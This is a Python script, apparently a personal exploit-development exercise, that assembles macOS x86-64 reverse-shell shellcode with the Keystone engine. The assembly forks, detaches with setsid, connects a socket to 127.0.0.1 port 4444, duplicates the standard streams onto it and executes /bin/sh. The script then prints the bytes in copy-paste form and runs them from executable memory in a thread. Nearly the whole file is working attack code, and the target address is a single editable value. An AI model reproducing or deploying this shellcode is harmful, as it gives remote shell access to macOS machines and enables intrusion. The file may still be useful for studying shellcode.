#!/usr/bin/env python3
# https://sigsegv.pl/osx-bsd-syscalls/ mac os
import ctypes, struct, binascii, os, socket
from keystone import *

def reverse_to_little_endian(data):
    swap_data = bytearray(data)
    swap_data.reverse()
    return bytes(swap_data)

def format_shellcode(shellcode):
    LINE_LENGTH=40
    raw = binascii.hexlify(shellcode)
    escaped = (b"\\x" + b"\\x".join(raw[i:i+2] for i in range (0, len(raw), 2))).decode('utf-8')
    lines = [escaped[i: i+LINE_LENGTH] for i in range(0, len(escaped), LINE_LENGTH)]
    return "shellcode = \tb\"" + "\"\nshellcode += \tb\"".join(lines) + "\""

def sockaddr():
    shell_ip = "127.0.0.1"
    shell_port = 4444


    #include <netinet/in.h>

    #struct sockaddr_in {
    #    short            sin_family;   // e.g. AF_INET
    #    unsigned short   sin_port;     // e.g. htons(3490)
    #    struct in_addr   sin_addr;     // see struct in_addr, below
    #    char             sin_zero[8];  // zero this if you want to
    #};

    #struct in_addr {
    #    unsigned long s_addr;  // load with inet_aton()
    #};


    struct_sockaddr_family = struct.pack('h', socket.AF_INET) # short
    struct_sockaddr_port = struct.pack('H',socket.htons(shell_port)) # unsigned short
    struct_sockaddr_ip = socket.inet_pton(socket.AF_INET, shell_ip) # long

    # we must reverse the values
    struct_sockaddr_family = reverse_to_little_endian(struct_sockaddr_family)
    struct_sockaddr_port = reverse_to_little_endian(struct_sockaddr_port)
    struct_sockaddr_ip = reverse_to_little_endian(struct_sockaddr_ip)

    sockaddrvalue = struct_sockaddr_ip + struct_sockaddr_port + struct_sockaddr_family

    # 0x01 and 0x1 is the same shit
    sockaddrvalue = "0x" + binascii.hexlify(sockaddrvalue).decode("UTF-8")

    # TODO NEGATE TO REMOVE NULL BYTES
    sockaddrvalue = sockaddrvalue
    address = hex(id(sockaddrvalue))
    value_at_address = ctypes.cast(id(sockaddrvalue), ctypes.py_object).value

    # actually we dont need the address just the value as we push it on the stack
    #return address
    print(sockaddrvalue)
    return sockaddrvalue

def main():
    # Note: null-byte depends on the address and port.
    # Special modifications might be needed for some address.
    address = sockaddr()
    # https://sigsegv.pl/osx-bsd-syscalls/ must convert to hex
    # Shellcode is here

    nanosleepvalue = "0x1" # 1 seconds

    hello = "0x" + "48656c6c6f5c6e" # Hello\n

    assembly = (

            #"INT3;"
           "mov rcx, "+ hello + ";" # HEllO
           "push 0;" # we need to push a null byte on the stack  because string are null terminated
           "push rcx;" # then push the string on the stack
           "push rsp;"  # rsp points to the top of the stack, which is occupied by /bin/sh
           "pop rsi;"  

           "mov rax, 0x2000004;"   #SYS_write
           "mov rdi, 1;"           # stdout
           "mov rdx, 7;" # lenght
           "syscall;"
            
            "fork:"
            "mov rax, 0x2000002;" # fork
            "syscall;"
            "cmp	rdx,0;"	# rdx is used on osx not rax
            "je	parent;		"# parent ==0 in parent, 1 in child
            # https://opensource.apple.com/source/xnu/xnu-2050.48.11/libsyscall/custom/__fork.s
            #https://lists.apple.com/archives/darwin-kernel/2008/Apr/msg00124.html
            #"INT3;"

            "setsid:"
            "mov rax, 0x2000093;" # setsid
            "syscall;"

            
            "socket:"
            #"INT3;"
            "mov rax, 0x2000061;"  # Push/pop will set syscall num
            "mov rdi, 2;"  # AF_INET = 2
            "mov rsi, 1;"  # SOCK_STREAM = 1
            "mov rdx, 0;"
            "syscall;"  # socket(AF_INET, SOCK_STREAM, 0) 

            "connect:"
            "mov rdi, rax;"  # put   result in rdi
            "mov rax, 0x2000062;"
            "mov rcx, "+ address + ";" # cant push directly because can only push 32 bit on x86_64 platforms must use a register
            "push rcx;"
            "push rsp;"  # mov rsi, rsp. This it the pointer to sockaddr
            "pop rsi;"
            "mov rdx, 16;"  # sockaddr length
            "syscall;"  # connect(s, addr, 16)

            
           "dup2:" # redirect stdin stderr stdout shuld use loop
           "mov rax, 0x200005A;"
           "mov rsi, 2;"
           "syscall;"
           "mov rax, 0x200005A;"
           "mov rsi, 1;"
           "syscall;"
           "mov rax, 0x200005A;"
           "mov rsi, 0;"
           "syscall;"

           "execve:"
           "mov rax, 0x200003B;"  # execve syscall is 59
           "mov rcx, 0x68732f2f6e69622f;"  # /bin//sh
           "push 0;" # we need to push a null byte on the stack  because string are null terminated
           "push rcx;" # then push the string on the stack
           "push rsp;"  # rsp points to the top of the stack, which is occupied by /bin/sh
           "pop rdi;"  # We use a push/pop to prevent null-byte and get a shorter shellcode
           "mov rsi, 0;"
           "mov rdx, 0;"
           "syscall;"  # execve('/bin//sh', NULL, NULL)
           # http://uninformed.org/index.cgi?v=1&a=1&p=16 must call fork for it to work

            "parent:"
            # https://github.com/st3fan/osx-10.9/blob/master/Libc-997.1.1/gen/nanosleep.c
            # no sleep system call currently ( migth get terminated by the os )
            #"mov rcx, "+ nanosleepvalue + ";"
            #"push rcx;"
            #"push rsp;"  # mov rsi, rsp. This it the pointer to timespec
            #"pop rdi;"
            #"mov rsi, 0;" # no nanoseconds so NULL rip null byte should negate this shit
            #"mov rax, 35;" # nanosleep
            #"syscall;"
            
            
            # show message since mac has no sleep syscall
            #"INT3;"
            "setupshowmessage:"
            "mov r8, 0;"

            "showmessage:"
            "inc r8;" # use 100% cpu cuz mac osx trolling
            "cmp r8, 999000000;"
            "jne showmessage;"
            "mov rcx, 0x42;" # B\n  -> 0D is carriage return in hex
            "push 0;" # we need to push a null byte on the stack  because string are null terminated
            "push rcx;" # then push the string on the stack
            "push rsp;"  # rsp points to the top of the stack, which is occupied by /bin/sh
            "pop rsi;"  

            "mov rax, 0x2000004;"   #SYS_write
            "mov rdi, 1;"           # stdout
            "mov rdx, 2;" # lenght string + null byte
            "syscall;"

            # ddidnt figure out how to flush stdout so x)

            "jmp parent;"

    )

    engine = Ks(KS_ARCH_X86, KS_MODE_64)
    shellcode, count = engine.asm(assembly)
    shellcode = bytearray(shellcode)  # Needs to be mutable for later

    print("Number of instructions: " + str(count))

    # Print shellcode in a copy-pasteable format
    print()
    print("Shellcode length: %d" % len(shellcode))
    print()

    print(format_shellcode(shellcode))
    print()

    #####################################################################
    #                   TESTING THE SHELLCODE                           #
    #####################################################################
    #https://www.exploit-db.com/exploits/38065
    # The rest of the script is used to test the shellcode. Don't run this if you just need the shellcode

    # Leave time to attach the debugger
    print("If you want to debug, attach the debugger to the python process with pid %d then press enter." % os.getpid())
    input()

    # Load libraries
    libc = ctypes.cdll.LoadLibrary("libc.dylib")
    libpthread = ctypes.cdll.LoadLibrary("libpthread.dylib")

    # Put the shellcode into a ctypes valid type.
    shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # Both function returns 64bits pointers
    libc.malloc.restype = ctypes.POINTER(ctypes.c_int64)
    libc.mmap.restype = ctypes.POINTER(ctypes.c_int64)

    # Get page size for mmap
    page_size = libc.getpagesize()

    # mmap acts like malloc, but can also set memory protection so we can create a Write/Execute shellcodefer
    # void *mmap(void *addr, size_t len, int prot, int flags,
    #   int fildes, off_t off);
#
#Protections are chosen from these bits, or-ed together
#
#define	PROT_NONE	0x00	/* [MC2] no permissions */
#define	PROT_READ	0x01	/* [MC2] pages can be read */
#define	PROT_WRITE	0x02	/* [MC2] pages can be written */
#define	PROT_EXEC	0x04	/* [MC2] pages can be executed */

# flags https://github.com/nneonneo/osx-10.9-opensource/blob/master/xnu-2422.1.72/bsd/sys/mman.h
#define	MAP_SHARED	0x0001		/* [MF|SHM] share changes */
#define	MAP_ANON	0x1000	/* allocated from memory, swap space */
#define	MAP_PRIVATE	0x0002		/* [MF|SHM] changes are private */
    ptr = libc.mmap(ctypes.c_int64(0),  # NULL
                    ctypes.c_int(page_size),  # Pagesize, needed for alignment
                    ctypes.c_int(0x01 | 0x02 | 0x04),  # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
                    ctypes.c_int(0x1000 | 0x0002),  # MAP_ANONYMOUS | MAP_PRIVATE
                    ctypes.c_int(-1),  # No file descriptor
                    ctypes.c_int(0))  # No offset
                    

    print(ptr)

    # Copy shellcode to newly allocated page.
    libc.memcpy(ptr,  # Destination of our shellcode
                shellcode,  # Shellcode location in memory
                ctypes.c_int(len(shellcode)))  # Nomber of bytes to copy

    # Allocate space for pthread_t object.
    # Note that pthread_t is 8 bytes long, so we'll treat it as an opaque int64 for simplicity
    thread = libc.malloc(ctypes.c_int(8))

    # Create pthread in the shellcodefer.
    # int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
    #   void *(*start_routine) (void *), void *arg);
    libpthread.pthread_create(thread,  # The pthread_t structure pointer where the thread id will be stored
                              ctypes.c_int(0),  # attributes = NULL
                              ptr,  # Our shellcode, which is what we want to execute
                              ctypes.c_int(0))  # NULL, as we don't pass arguments

    # Wait for the thread.
    # int pthread_join(pthread_t thread, void **retval);
    libpthread.pthread_join(thread.contents,  # Here, we pass the actual thread object, not a pointer to it
                            ctypes.c_int(0))  # Null, as we don't expect a return value

    print("bob")



main()
